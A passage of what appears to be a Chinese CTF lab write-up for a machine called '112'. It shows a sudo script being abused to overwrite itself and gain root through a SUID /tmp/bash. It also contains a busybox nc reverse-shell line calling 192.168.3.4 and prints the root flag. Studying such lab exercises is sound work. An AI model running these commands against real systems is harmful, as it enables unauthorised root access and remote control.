+<li><strong>覆盖目标脚本</strong>： 利用漏洞将 <code>/opt/112.sh</code> 覆盖为指向我们 <code>Payload</code> 的路径字符串：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /opt/112.sh -u https://maze-sec.com/x -o /opt/112.sh</span><br></pre></td></tr></table></figure>
+<p>此时 <code>/opt/112.sh</code> 内容变为：<code>https://maze-sec.com/x is a good url.</code> (或 “<code>... is not a good url.</code>“)。</p>
+<ol start="3">
+<li><strong>触发 Payload</strong>： 再次执行 <code>sudo</code> 命令。由于当前目录是 <code>/home/tuf</code>，Bash 能够找到并执行相对路径 <code>https://maze-sec.com/x</code>。</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /opt/112.sh    </span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li><strong>获取 Root 权限</strong>： 检查 <code>/tmp/bash</code> 是否生成且具有 <code>SUID</code> 权限</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -la /tmp/bash  </span><br><span class="line">-rwsr-sr-x 1 root root ... /tmp/bash   </span><br></pre></td></tr></table></figure>
+<p>使用 SUID bash 读取 root flag：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/bash -p -c <span class="string">&quot;cat /root/root.txt&quot;</span></span><br></pre></td></tr></table></figure>
+<p>Flag: <code>flag{root-538dc127225a0c97b060b1ff9570390a}</code></p>
+<h3 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h3><p>前面新建文件夹一样，<code>x</code>内容可以用<code>nc</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> https://maze-sec.com/x</span><br><span class="line"><span class="comment">#!/bin/bash </span></span><br><span class="line">busybox nc 192.168.3.4 1111 -e /bin/bash</span><br><span class="line">$ <span class="built_in">chmod</span> +x https:/maze-sec.com/x</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">112112.txt</span><br><span class="line">root.txt</span><br><span class="line"><span class="built_in">cat</span> 112112.txt</span><br><span class="line">OArZQcW05k5QmPX8lKQ7</span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line">flag&#123;root-538dc127225a0c97b060b1ff9570390a&#125;</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/zhaochoudecat">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">1.信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-number">1.1.</span> <span class="toc-text">构造payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">构造原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-DTD-%E5%AE%9A%E4%B9%89%E9%83%A8%E5%88%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. DTD 定义部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%81%B6%E6%84%8F%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 恶意实体声明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AE%9E%E4%BD%93%E5%BC%95%E7%94%A8%E9%83%A8%E5%88%86"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. 实体引用部分</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-ssh"><span class="toc-number">2.</span> <span class="toc-text">2.ssh</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E6%9E%84%E9%80%A0%E5%AD%97%E5%85%B8"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 构造字典</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2hydra%E7%88%86%E7%A0%B4"><span class="toc-number">2.2.</span> <span class="toc-text">2.2hydra爆破</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">3.提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Broot%E6%9D%83%E9%99%90%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">查看root权限的文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.3.</span> <span class="toc-text">提权步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%B8%80"><span class="toc-number">3.3.1.</span> <span class="toc-text">方案一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%BA%8C"><span class="toc-number">3.3.2.</span> <span class="toc-text">方案二</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/&text="><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/&title="><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/&is_video=false&description="><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/&title="><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/&title="><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/&title="><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/&title="><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/&name=&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2026 zhaochoudecat
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/zhaochoudecat">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
